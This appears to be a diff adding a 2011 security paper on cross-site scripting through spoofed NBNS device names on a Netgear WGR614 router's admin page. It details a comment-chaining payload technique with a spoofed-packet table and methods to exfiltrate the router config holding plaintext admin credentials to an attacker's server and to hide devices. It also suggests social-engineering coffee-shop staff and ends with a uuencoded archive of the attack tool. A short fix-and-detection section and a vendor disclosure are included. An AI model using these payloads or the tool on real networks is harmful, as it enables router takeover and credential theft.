@@ -1,0 +1,491 @@
+XSS Using NBNS on a Home Router
+
+October 2011
+Simon Weber
+sweb090@gmail.com
+
+--[ code is appended, but may not be the most recent. check:
+    https://github.com/simon-weber/XSS-over-NBNS
+    for the most recent version. ]--
+
+--[ Contents
+
+    1 - Abstract
+
+    2 - Test Device Background
+
+    3 - Injection Chaining Technique
+
+    4 - Device Specific Exploits
+     4.1 - Steal Router Admin Credentials
+     4.2 - Hide a Device on the Network
+   
+    5 - Tool
+
+    6 - Fix, Detection and Prevention
+
+    7 - Applications
+
+    8 - References
+
+
+--[ 1 - Abstract
+
+For routers which:
+
+        1) use NBNS to identify attached devices
+        2) list these devices on their web admin interface
+        3) do not sanitize the names they receive
+
+there exists a 15 character injection vector on the web interface. This
+vector can be exploited by anyone on the network, and will affect anyone
+who visits a specific page on the web administration interface. Using
+multiple injections in sequence separated with block comments, it is
+possible to chain these injections to create a payload of arbitrary
+length. This can be used to gain router admin credentials, steal cookies
+from an admin, alter the view of attached devices, or perform any other
+XSS attack.
+
+The real world application of the technique is limited by how often
+admins are on the web interface. However, coupled with some social
+engineering, small businesses such as coffee shops may be vulnerable.
+
+--[ 2 - Test Device Background
+
+I got a Netgear wgr614 v5 for less than $15 shipped on eBay. This is a
+common home wireless B/G router. Originally released in 2004, its EOL
+was about 5 years ago [1].
+
+The web admin interface is pretty poorly built (sorry, Netgear!). If you
+poke around, you'll find a lot of unescaped input fields to play
+with. However, none of them can really be used to do anything
+interesting - they're one time injection vectors that other users won't
+see.
+
+However, there is one interesting page. This is the "attached devices"
+page (DEV_devices.htm). It shows a table of what's connected to the
+router, and looks something like this:
+
+        #  Name        IP              MAC
+        1  computer_1  192.168.1.2     07:E0:17:8F:11:2F
+        2  computer_2  192.168.1.11    AF:3C:07:4D:B0:3A
+        3     --       192.168.1.15    EB:3C:76:0F:67:43
+
+This table is generated from the routing table, and the name is filled
+in from NBNS responses to router requests. If a machine doesn't respond
+to NBNS, takes too long to respond, or it gives an invalid name (over 15
+characters or improperly terminated), the name is set to "--". The table
+is refreshed in two ways: automatically by the router at an interval,
+and by a user visiting or refreshing the page.
+
+A quick test showed that the name in this table was unescaped. However,
+this only gets us 15 characters of payload. I couldn't manage to squeeze
+a reference to external code in just 15 characters (maybe someone else
+can?). Executing arbitrary code will require something a bit more
+sophisticated.
+
+--[ 3 - Injection Chaining Technique
+
+The obvious way to get more characters for the payload is by chaining
+together multiple injections. To do this, we need a few things:
+
+    1) A way to make multiple entries in the table:
+        This is easy, we just send out fake responses for IP/MAC
+        combinations that don't already exist on the network.
+
+    2) A way to control the order of our entries:
+        Also easy: the table orders by IP address. We'll just use a
+        range of incremental addresses that no one else is using.
+
+    3) A way to chain our entries around the other html:
+        Block comments will work for this. Our injections will just open
+        and close block comments at the end and beginning of their
+        reported names. For an illustration, imagine anything between <>
+        will be ignored on the page, and our name injections are
+        delimited with single quotes:
+
+                      '[name 1] <' [ignored stuff]
+    [ignored stuff] '> [name 2] <' [ignored stuff]
+           ...      '> [name 3] <'      ...
+
+Great, that was easy. What kind of block comments can we use? How about
+html's?. This could work, but it has limitations. First off, -- or >
+anywhere in the commented out html will break things. Even if this did
+work, we'd have to be careful about where we split things, and the
+comments would take up about half of a 15 char name.
+
+Javascript's c-style block comments are smaller and more flexible. They
+can come anywhere in code, so long as it isn't the middle of a
+token. For example,
+
+            document/* ignored */.write("something")
+
+    is fine, while
+
+            docu/* uh oh */ment.write("something")
+
+    breaks things.
+
+We also just need to avoid */ in the commented out html, which should be
+much less likely to pop up than >. To use javascript block comments,
+we'll obviously need to use javascript to get our payload onto the
+page. Call it our "payload transporter". This will work just fine:
+
+            "<script>document.write('[payload]');</script>"
+
+So, then, the first thing to do is fit our transporter into 15 char
+chunks to send as our first few fake NBNS names. Being careful not to
+split tokens with comments, our first 3 names can be:
+
+            <script>/*
+            */document./*
+            */write(/*
+
+This will open the write command to inject our payload. Now we need to
+package the payload into the transporter in some more 15 char
+chunks. Since strings are tokens, we can't split one big string with
+block comments. We need to split up the payload into multiple strings
+and introduce more tokens between them. To do this, I leveraged the fact
+that document.write can take multiple arguments, which it will write in
+order - the commas that split parameters will be our extra
+tokens. String concatenation would work, too. So, our payload will be
+packaged into the transporter like:
+
+            'first part of payload', /*
+            */ 'second part of payload', /*
+            */ 'third part...', /*
+                    ...
+            */ ,'last part'); /*
+
+It's easy to control the length of the strings to fit into the 15 char
+length (we've just got to be careful about quotes in our
+payload). Lastly, we just need to close the script tag, and we're
+done. We now have a way to write an arbitrary length payload onto the
+attached devices page. Putting it all together, here's an example of
+what our series of fake NBNS responses could be if we wanted to get
+'<script>alert("test");</script>' onto the page:
+
+            Spoofed NBNS Name   IP               MAC
+            <script>/*          192.168.1.111    00:00:00:00:00:01
+            */document./*       192.168.1.112    00:00:00:00:00:02
+            */write(/*          192.168.1.113    00:00:00:00:00:03
+            */'<script>',/*     192.168.1.114    00:00:00:00:00:04
+            */'alert(\'',/*     192.168.1.115    00:00:00:00:00:05
+            */'test\');',/*     192.168.1.116    00:00:00:00:00:06
+            */'</script',/*     192.168.1.117    00:00:00:00:00:07
+            */'>');/*           192.168.1.118    00:00:00:00:00:08
+            */</script>         192.168.1.119    00:00:00:00:00:09
+
+There are a few other practical considerations that I found while
+working with my specific Netgear router. It will use the most recent
+information it has for device names. This means that we have to send our
+payload every time that requests are sent out. It also means that for
+some time after we stop injecting, the device listing is going to have a
+number of '--' entries; the router is expecting to get names for these
+devices but sees no response. To hide our tracks, we could reboot the
+router when finished (this is possible by either injection or after
+stealing admin credentials, which is detailed below).
+
+We also have to be careful that a legitimate device doesn't come on to
+the network with one of our spoofed IPs or MACs. This could possibly
+break our injection, depending on the timing of responses.
+
+One last thing to keep in mind: the NBNS packets need to get on the wire
+quickly, since the router only listens for NBNS responses for a short
+time. Thus, smaller payloads (which fit into less packets) are more
+likely to succeed. You'll want to create external javascript to do any
+heavy lifting, and just inject code to run it. When a payload fails,
+earlier packets will get there and others won't, leaving garbage in the
+attached devices list.
+
+--[ 4 - Device Specific Exploits
+
+Naturally, anything that can be done with XSS or javascript is fair
+game. You can attack the user (cookie stealing), the router (injected
+requests to the web interface are now authed), or the page itself. I
+created a few interesting examples that are specific to the Netgear
+device I had.
+
+------[ 4.1 - Steal Router Admin Credentials
+
+On the admin interface, there is an option to backup and restore the
+router settings. It generates a simple flat file database called
+netgear.cfg. This file itself is actually rather interesting. It seems
+to be a plaintext memory dump, guarded from manipulation by a checksum
+that I couldn't figure out (no one has cracked it as of the time this
+was written - if you do, let me know). In it, you'll find everything
+from wireless keys to static routes to - surprise - plaintext
+administrator information. This includes usernames and passwords for
+both the http admin and telnet super admin (see [3] for information on
+the hidden telnet console).
+
+It's easy to steal this file via XSS in the same way that cookies are
+stolen. The attacker first sets up a listening http server to receive
+the information. Then, the injection code simply GETs the file and sends
+it off to the listening server.
+
+With admin access to the router, the attacker can do all sorts of
+things. Basic traffic logging is built-in, and can even be emailed out
+automatically. DoS is possible through the router's website blocking
+functions. Man in the middle attacks are possible through the exposed
+dhcp dns, static routing and internet connection configuration options.
+
+------[ 4.2 - Hide a Device on the Network
+
+The only place that an admin can get information about who is on the
+network is right on the page we inject to. Manipulating the way the
+device list is displayed could provide simple counter-detection against
+a suspicious administrator.
+
+For this exploit, we inject javascript to iterate through the table and
+remove any row that matches a device we're interested in. Then, the
+table is renumbered. Note that we don't have to own the device to remove
+it from the list.
+
+Going one step further, the attacker can bolster the cloak of
+invisibility. Blocking connections not originating from the router is an
+obvious choice. It might be wise to block pings directly from the router
+as well.
+
+--[ 5 - Tool
+
+I used Scapy with Python to implement the technique and exploits
+described above and hosted it on Github [2]. You can also specify a
+custom exploit that will be packaged and sent using my chaining
+technique. I also made a simple python http server to listen for stolen
+admin credentials and serve up external exploit code. Credit goes to
+Robert Wesley McGrew for NBNSpoof; I reused some of his code [4].
+
+To combat the problem I described earlier about sending packets quickly,
+I listen for the first request from the router and precompute the
+response packets to send. These will be sent as responses to any other
+requests sniffed. You'll notice this if you use my tool; a "ready to
+inject" message will be printed after the responses are generated.
+
+If you look at my built-in exploits, you'll see they each use a
+loadhelp2 function as the entry point. This is just an easy way to get
+them to run when the page is loaded. The router declares the loadhelp
+function externally, and runs it on page load; I declare it on the page
+(so my version is actually used), and use it to launch my external
+loadhelp2 code. Then, the original code is patched on to the end, so the
+user doesn't notice.
+
+--[ 6 - Fix, Detection and Prevention
+
+To close the hole, Netgear would only need to change some web backend
+code in the firmware to escape NBNS names. I contacted Netgear about
+this. They won't make a fix for this specific model - it already saw its
+support EOL - but they are checking their newer models for this flaw as
+of September 2011 [1].
+
+So, if you have this router, know that a fix isn't coming. While it may
+be difficult to initially detect that a device you own is being
+attacked, once you suspect it there are simple ways to verify it:
+
+        check the source of the affected page; you'll see the commented
+        out device entries with suspicious names
+
+        use the hidden telnet interface. This will show the many fake
+        IPs that are generated when packing a payload.
+
+        as a last resort, watch network traffic for malformed NBNS names
+
+Also, keep in mind that you can only be affected when checking your
+router's configuration. You could protect yourself completely by never
+visiting the web administration interface.
+
+--[ 7 - Applications
+
+Of course, this technique's practical application is limited to how
+often users check their router admin pages. However, when coupled with
+some social engineering, I could imagine a vulnerability for small
+businesses like coffee shops.
+
+These locations commonly offer wireless using off-the-shelf hardware
+like my Netgear router. Getting on their network is easy - it's
+already open. At this point, the attacker starts the exploit, then
+convinces an employee to check the admin pages (maybe "I'm having some
+strange issues with the wireless...Can you check on the router and see
+if my device is showing up?"). I'm sure a practiced social engineer
+would have no trouble pulling this off.
+
+As far as applying this beyond the home networking realm, a good place
+to start would be investigating this technique on other routers or
+better firmwares like DD-WRT or Tomato. That would at least determine if
+this is a common flaw. I didn't have another device to play with (the
+wgr614v5 doesn't work with other firmware), so I'll leave it for someone
+else to try.
+
+I'm doubtful that other applications very different from what I
+described exist. Router administration pages simply aren't viewed very
+much. However, the broader idea of XSS through spoofed NBNS names might
+be applicable to a different domain. Anywhere there is a listing of NBNS
+names, there is the possibility of an injection vector.
+
+--[ 8 - References
+
+[1]  private communication with Netgear, September 2011
+[2]  https://github.com/simon-weber/XSS-over-NBNS
+[3]  http://www.seattlewireless.net/NetgearWGR614#TelnetConsole
+[4]  http://www.mcgrewsecurity.com/tools/nbnspoof/
+
+
+begin 644 xss_over_nbns.tgz
+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
+2X,"!`P<.7A_^`BMJX<X`>```
+`
+end
